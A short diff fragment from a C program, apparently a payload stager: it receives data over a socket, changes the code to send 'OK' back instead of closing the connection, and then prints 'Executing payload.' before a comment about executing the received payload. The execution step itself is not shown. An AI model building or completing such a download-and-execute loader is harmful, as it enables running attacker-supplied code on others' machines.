@@ -52,7 +52,7 @@ int main() {
     rcvd += res;
   } while (size > rcvd);
 
-  closesocket(ConnectSocket);
+  send(ConnectSocket, "OK", 3, 0);
 
   printf("Executing payload.\n");
   // Execute the received payload
